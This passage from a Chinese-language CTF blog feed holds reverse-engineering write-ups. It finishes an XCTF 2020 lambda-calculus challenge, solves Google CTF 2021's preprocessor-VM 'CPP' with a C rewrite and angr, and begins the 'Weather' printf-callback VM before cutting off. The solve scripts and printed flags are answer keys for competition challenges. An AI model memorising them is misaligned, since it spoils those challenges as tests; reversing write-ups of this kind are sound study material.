class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">XOR_EXPR = []<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">simplify</span>(<span class="hljs-params">lam</span>):</span><br>    <span class="hljs-keyword">if</span> lam[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;call&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(lam[<span class="hljs-number">1</span>]) == <span class="hljs-built_in">list</span>:<br>            func = simplify(lam[<span class="hljs-number">1</span>])<br>            expr =  <span class="hljs-string">&quot;(&quot;</span> + func + <span class="hljs-string">&quot; &quot;</span> + simplify(lam[<span class="hljs-number">2</span>]) + <span class="hljs-string">&quot;)&quot;</span><br>            <span class="hljs-keyword">if</span> func.startswith(<span class="hljs-string">&quot;XOR&quot;</span>):<br>                XOR_EXPR.append(expr)<br>            <span class="hljs-keyword">return</span> expr<br>        <span class="hljs-keyword">elif</span> lam[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;AND&quot;</span>, <span class="hljs-string">&quot;OR&quot;</span>, <span class="hljs-string">&quot;XOR&quot;</span>, <span class="hljs-string">&quot;NOT&quot;</span>]:<br>            expr = lam[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot; &quot;</span>+ simplify(lam[<span class="hljs-number">2</span>])<br>            <span class="hljs-keyword">return</span> expr<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(lam)<br></code></pre></td></tr></table></figure><p>==solve 脚本==</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>():</span><br>    dd = <span class="hljs-string">&#x27;&#x27;</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> expr <span class="hljs-keyword">in</span> XOR_EXPR:<br>        a = expr[<span class="hljs-number">17</span>]<br>        b = expr[<span class="hljs-number">33</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;FALSE&quot;</span> <span class="hljs-keyword">in</span> expr:<br>            flag += a<br>        <span class="hljs-keyword">else</span>:<br>            flag += b<br>        i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>:<br>            flag = flag[::-<span class="hljs-number">1</span>]<br>            print(flag)<br>            dd += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag, <span class="hljs-number">2</span>))<br>            flag = <span class="hljs-string">&#x27;&#x27;</span><br>            i = <span class="hljs-number">0</span><br>    print(dd) <span class="hljs-comment"># XCTF&#123;14mBdA_C4LcU1u5_1MpL33mEn7_XOOOO0oO0Oo000R&#125;</span><br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://goodmath.blogspot.com/2006/05/my-favorite-calculus-lambda-part-1.html">http://goodmath.blogspot.com/2006/05/my-favorite-calculus-lambda-part-1.html</a><br><a href="http://goodmath.blogspot.com/2006/06/lamda-calculus-index.html">http://goodmath.blogspot.com/2006/06/lamda-calculus-index.html</a><br><a href="https://github.com/Mem2019/MyCTFChallenges/tree/master/XCTF2020/lambda">https://github.com/Mem2019/MyCTFChallenges/tree/master/XCTF2020/lambda</a><br><a href="http://www.cs.columbia.edu/~sedwards/classes/2012/w4115-fall/lambda.pdf">http://www.cs.columbia.edu/~sedwards/classes/2012/w4115-fall/lambda.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>math</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>math</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google CTF 2021</title>
    <link href="/2021/07/19/Google-CTF-2021/"/>
    <url>/2021/07/19/Google-CTF-2021/</url>
    
    <content type="html"><![CDATA[<h1 id="Google-CTF-2021"><a href="#Google-CTF-2021" class="headerlink" title="Google CTF 2021"></a>Google CTF 2021</h1><p>真 一边做题一边学知识的比赛。</p><h2 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h2><p>题目下载： <a href="/2021/07/19/Google-CTF-2021/cpp.c" title="cpp.c">cpp.c</a></p><p>这道题目只给了一个 C 源文件，用宏定义实现了逻辑电路，有接近 6000 行代码，人吓傻了。</p><h3 id="ROM-定义"><a href="#ROM-定义" class="headerlink" title="ROM 定义"></a>ROM 定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">...<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ROM_01000010_4 1</span><br>...<br></code></pre></td></tr></table></figure><p>其中 <code>01000010</code> 是 ROM 地址二进制, <code>4</code> 表示第 4 个 bit 位， <code>1</code> 表示值是 1</p><p>输入的 flag 起始 ROM 地址 10000000 （128） 地址，一共 26 字节 flag， 占 ROM 地址 128 ～ 128 + 26</p><h3 id="ROM-访问指令"><a href="#ROM-访问指令" class="headerlink" title="ROM 访问指令"></a>ROM 访问指令</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _LD(x, y) ROM_ ## x ## _ ## y</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LD(x, y) _LD(x, y)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _MA(l0, l1, l2, l3, l4, l5, l6, l7) l7 ## l6 ## l5 ## l4 ## l3 ## l2 ## l1 ## l0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MA(l0, l1, l2, l3, l4, l5, l6, l7) _MA(l0, l1, l2, l3, l4, l5, l6, l7)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> l MA(l0, l1, l2, l3, l4, l5, l6, l7)</span><br></code></pre></td></tr></table></figure><p>l0 ~ l7 是对 ROM 进行寻址的参数。</p><h3 id="指令逻辑"><a href="#指令逻辑" class="headerlink" title="指令逻辑"></a>指令逻辑</h3><p>类似 vm 吧，S 定义类似于指令计数器，利用嵌套 include 实现重新进入指令 dispatch.<br>C语言里的 #define X 表示 X = 1, #undef X 表示 X = 0</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c++">S == <span class="hljs-number">0</span>  <span class="hljs-comment">// GOTO 24</span><br>S == <span class="hljs-number">1</span>  <span class="hljs-comment">// R = ~R</span><br>S == <span class="hljs-number">3</span>  <span class="hljs-comment">// R = R + Z</span><br>S == <span class="hljs-number">4</span>  <span class="hljs-comment">// R = R + Z</span><br>S == <span class="hljs-number">5</span>  <span class="hljs-comment">// IF(!R) GOTO 38 ELSE 6</span><br>S == <span class="hljs-number">6</span>  <span class="hljs-comment">// R = R + Z</span><br>S == <span class="hljs-number">7</span>  <span class="hljs-comment">// IF(!R) GOTO 59 ELSE 8</span><br>S == <span class="hljs-number">8</span>  <span class="hljs-comment">// R = R + Z</span><br>S == <span class="hljs-number">9</span>  <span class="hljs-comment">// IF(!R) GOTO 59 ELSE 10</span><br>S == <span class="hljs-number">10</span> <span class="hljs-comment">// BUG</span><br>S == <span class="hljs-number">11</span> <span class="hljs-comment">// GOTO -1</span><br>S == <span class="hljs-number">12</span> <span class="hljs-comment">// X = 1</span><br>S == <span class="hljs-number">13</span> <span class="hljs-comment">// Y = 0</span><br>S == <span class="hljs-number">14</span> <span class="hljs-comment">// IF(!X) GOTO 22 ELSE 15</span><br>S == <span class="hljs-number">15</span> <span class="hljs-comment">// Z = X</span><br>S == <span class="hljs-number">16</span> <span class="hljs-comment">// Z = Z &amp; B</span><br>S == <span class="hljs-number">17</span> <span class="hljs-comment">// IF(!Z) GOTO 19 ELSE 18</span><br>S == <span class="hljs-number">18</span> <span class="hljs-comment">// Y = Y + A</span><br>S == <span class="hljs-number">19</span> <span class="hljs-comment">// X = X + X</span><br>S == <span class="hljs-number">20</span> <span class="hljs-comment">// A = A + A</span><br>S == <span class="hljs-number">21</span> <span class="hljs-comment">// GOTO 14</span><br>S == <span class="hljs-number">22</span> <span class="hljs-comment">// A = Y</span><br>S == <span class="hljs-number">23</span> <span class="hljs-comment">// GOTO 1</span><br>S == <span class="hljs-number">24</span> <span class="hljs-comment">// I = 0</span><br>S == <span class="hljs-number">25</span> <span class="hljs-comment">// M = 0</span><br>S == <span class="hljs-number">26</span> <span class="hljs-comment">// N = 1</span><br>S == <span class="hljs-number">27</span> <span class="hljs-comment">// S = 0</span><br>S == <span class="hljs-number">28</span> <span class="hljs-comment">// Q = 0</span><br>S == <span class="hljs-number">29</span> <span class="hljs-comment">// B = 229</span><br>S == <span class="hljs-number">30</span> <span class="hljs-comment">// B = B + I</span><br>S == <span class="hljs-number">31</span> <span class="hljs-comment">// IF(!B) Goto 56 ELSE 32</span><br>S == <span class="hljs-number">32</span> <span class="hljs-comment">// B = 128</span><br>S == <span class="hljs-number">33</span> <span class="hljs-comment">// B = B + I</span><br>S == <span class="hljs-number">34</span> <span class="hljs-comment">// A = ROM[B]</span><br>S == <span class="hljs-number">35</span> <span class="hljs-comment">// B = ROM[I]</span><br>S == <span class="hljs-number">36</span> <span class="hljs-comment">// R = 1</span><br>S == <span class="hljs-number">37</span> <span class="hljs-comment">// Goto 12</span><br>S == <span class="hljs-number">38</span> <span class="hljs-comment">// O = M</span><br>S == <span class="hljs-number">39</span> <span class="hljs-comment">// O = O + N</span><br>S == <span class="hljs-number">40</span> <span class="hljs-comment">// M = N</span><br>S == <span class="hljs-number">41</span> <span class="hljs-comment">// N = O</span><br>S == <span class="hljs-number">42</span> <span class="hljs-comment">// A = A + M</span><br>S == <span class="hljs-number">43</span> <span class="hljs-comment">// B = 32</span><br>S == <span class="hljs-number">44</span> <span class="hljs-comment">// B = B + I</span><br>S == <span class="hljs-number">45</span> <span class="hljs-comment">// C = ROM[B]</span><br>S == <span class="hljs-number">46</span> <span class="hljs-comment">// A = C ^ A</span><br>S == <span class="hljs-number">47</span> <span class="hljs-comment">// P = P + A</span><br>S == <span class="hljs-number">48</span> <span class="hljs-comment">// B = 64</span><br>S == <span class="hljs-number">49</span> <span class="hljs-comment">// B = B + I</span><br>S == <span class="hljs-number">50</span> <span class="hljs-comment">// A = ROM[B]</span><br>S == <span class="hljs-number">51</span> <span class="hljs-comment">// A = A ^ P</span><br>S == <span class="hljs-number">52</span> <span class="hljs-comment">// Q = Q | A</span><br>S == <span class="hljs-number">53</span> <span class="hljs-comment">// A = 1</span><br>S == <span class="hljs-number">54</span> <span class="hljs-comment">// I = I + A</span><br>S == <span class="hljs-number">55</span> <span class="hljs-comment">// GOTO 29</span><br>S == <span class="hljs-number">56</span> <span class="hljs-comment">// IF(!Q) GOTO 58 ELSE 57</span><br>S == <span class="hljs-number">58</span> <span class="hljs-comment">// GOTO -1</span><br></code></pre></td></tr></table></figure><p>用 C语言重写并 Recompile</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> R = <span class="hljs-number">0</span>, Z = <span class="hljs-number">0</span>, X = <span class="hljs-number">0</span>, Y = <span class="hljs-number">0</span>, B = <span class="hljs-number">0</span>, A = <span class="hljs-number">0</span>, I = <span class="hljs-number">0</span>, M = <span class="hljs-number">0</span>, N = <span class="hljs-number">0</span>, S = <span class="hljs-number">0</span>, Q = <span class="hljs-number">0</span>, O = <span class="hljs-number">0</span>, C = <span class="hljs-number">0</span>, P = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bug</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bug\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">invalid</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;invalid\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">success</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;success\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ROM[<span class="hljs-number">500</span>] = &#123;                  <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCF</span>,<br>                                        <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1B</span>,<br>                                        <span class="hljs-number">0x08</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x5C</span>,<br>                                        <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x62</span>,<br>                                        <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x6E</span>,<br>                                        <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x1C</span> &#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input flag:\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;ROM[<span class="hljs-number">128</span>]);<br>    _0: <span class="hljs-keyword">goto</span> _24;<br>    _1: R = ~R;<br>    _2: Z = <span class="hljs-number">1</span>;<br>    _3: R = R + Z;<br>    _4: R = R + Z;<br>    _5: <span class="hljs-keyword">if</span>(!R) <span class="hljs-keyword">goto</span>  _38; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> _6;<br>    _6: R = R + Z;<br>    _7: <span class="hljs-keyword">if</span>(!R) <span class="hljs-keyword">goto</span> _59; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> _8;<br>    _8: R = R + Z;<br>    _9: <span class="hljs-keyword">if</span>(!R) <span class="hljs-keyword">goto</span> _59; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> _10;<br>    _10: bug();<br>    _11: <span class="hljs-keyword">goto</span> end;<br>    _12: X = <span class="hljs-number">1</span>;<br>    _13: Y = <span class="hljs-number">0</span>;<br>    _14: <span class="hljs-keyword">if</span>(!X) <span class="hljs-keyword">goto</span> _22; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> _15;<br>    _15: Z = X;<br>    _16: Z = Z &amp; B;<br>    _17: <span class="hljs-keyword">if</span>(!Z) <span class="hljs-keyword">goto</span> _19; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> _18;<br>    _18: Y = Y + A;<br>    _19: X = X + X;<br>    _20: A = A + A;<br>    _21: <span class="hljs-keyword">goto</span> _14;<br>    _22: A = Y;<br>    _23: <span class="hljs-keyword">goto</span> _1;<br>    _24: I = <span class="hljs-number">0</span>;<br>    _25: M = <span class="hljs-number">0</span>;<br>    _26: N = <span class="hljs-number">1</span>;<br>    _27: S = <span class="hljs-number">0</span>;<br>    _28: Q = <span class="hljs-number">0</span>;<br>    _29: B = <span class="hljs-number">229</span>;<br>    _30: B = B + I;<br>    _31: <span class="hljs-keyword">if</span>(!B) <span class="hljs-keyword">goto</span> _56; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> _32;<br>    _32: B = <span class="hljs-number">128</span>;<br>    _33: B = B + I;<br>    _34: A = ROM[B];<br>    _35: B = ROM[I];<br>    _36: R = <span class="hljs-number">1</span>;<br>    _37: <span class="hljs-keyword">goto</span> _12;<br>    _38: O = M;<br>    _39: O = O + N;<br>    _40: M = N;<br>    _41: N = O;<br>    _42: A = A + M;<br>    _43: B = <span class="hljs-number">32</span>;<br>    _44: B = B + I;<br>    _45: C = ROM[B];<br>    _46: A = C ^ A;<br>    _47: P = P + A;<br>    _48: B = <span class="hljs-number">64</span> ;<br>    _49: B = B + I;<br>    _50: A = ROM[B];<br>    _51: A = A ^ P;<br>    _52: Q = Q | A;<br>    _53: A = <span class="hljs-number">1</span>;<br>    _54: I = I + A;<br>    _55: <span class="hljs-keyword">goto</span> _29;<br>    _56: <span class="hljs-keyword">if</span>(!Q) <span class="hljs-keyword">goto</span> _58; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> _57;<br>    _57: invalid();<br>    _58: success();<br>    _59: invalid();<br>    end:<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;end..\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>recompile 之后用 angr 直接可以解出 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> angr <span class="hljs-keyword">import</span> *  <br>p = Project(<span class="hljs-string">&quot;./cpp&quot;</span>)  <br>state = p.factory.blank_state(addr=<span class="hljs-number">0x400000</span> + <span class="hljs-number">0x1200</span>)  <br>sm = p.factory.simulation_manager(state)  <br>res = sm.explore(find = [<span class="hljs-number">0x400000</span> + <span class="hljs-number">0x1760</span>], avoid=[<span class="hljs-number">0x400000</span>+<span class="hljs-number">0x11C0</span>, <span class="hljs-number">0x400000</span>+<span class="hljs-number">0x13D3</span>])  <br>print(res.found[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">0</span>)) <span class="hljs-comment"># CTF&#123;pr3pr0cess0r_pr0fe5sor&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Weather"><a href="#Weather" class="headerlink" title="Weather"></a>Weather</h2><p>题目下载： <a href="/2021/07/19/Google-CTF-2021/weather.zip" title="weather.zip">weather.zip</a></p><p>用 IDA 打开分析，main 函数里看不懂这道题想做什么，在翻 init_array 中的函数时发现，这道题目注册了格式化字符串回调。</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sas">register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;W&#x27;</span>, T0, arginfo);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;P&#x27;</span>, T1, arginfo);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;T&#x27;</span>, T2, arginfo);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;F&#x27;</span>, (printf_function <span class="hljs-comment">*)T3, arginfo);</span><br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;C&#x27;</span>, T4, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;M&#x27;</span>, T5, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;S&#x27;</span>, T6, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;O&#x27;</span>, T7, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;X&#x27;</span>, T8, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;V&#x27;</span>, T9, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;N&#x27;</span>, T10, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;L&#x27;</span>, T11, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;R&#x27;</span>, T12, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;E&#x27;</span>, T13, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;I&#x27;</span>, T14, retZero);<br>register_printf_functi<span class="hljs-meta">on(</span><span class="hljs-string">&#x27;U&#x27;</span>, T15, retZero);<br></code></pre></td></tr></table></figure><p>例如，格式化字符串中存在 “%W” 就回调用 T0 函数来处理 %W 参数。简单分析后发现有嵌套结构意味着这是一个用格式化字符串实现的vm。</p><p>逆向 T4 ～ T15 函数对格式化串的解析，可以得出指令及操作数解析规则。</p><p>print_info 结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++">truct printf_info<br>&#123;<br>  <span class="hljs-keyword">int</span> prec;<span class="hljs-comment">/* Precision.  */</span><br>  <span class="hljs-keyword">int</span> width;<span class="hljs-comment">/* Width.  */</span><br>  <span class="hljs-keyword">wchar_t</span> spec;<span class="hljs-comment">/* Format letter.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_long_double:<span class="hljs-number">1</span>;<span class="hljs-comment">/* L flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_short:<span class="hljs-number">1</span>;<span class="hljs-comment">/* h flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_long:<span class="hljs-number">1</span>;<span class="hljs-comment">/* l flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> alt:<span class="hljs-number">1</span>;<span class="hljs-comment">/* # flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> space:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Space flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> left:<span class="hljs-number">1</span>;<span class="hljs-comment">/* - flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> showsign:<span class="hljs-number">1</span>;<span class="hljs-comment">/* + flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> group:<span class="hljs-number">1</span>;<span class="hljs-comment">/* &#x27; 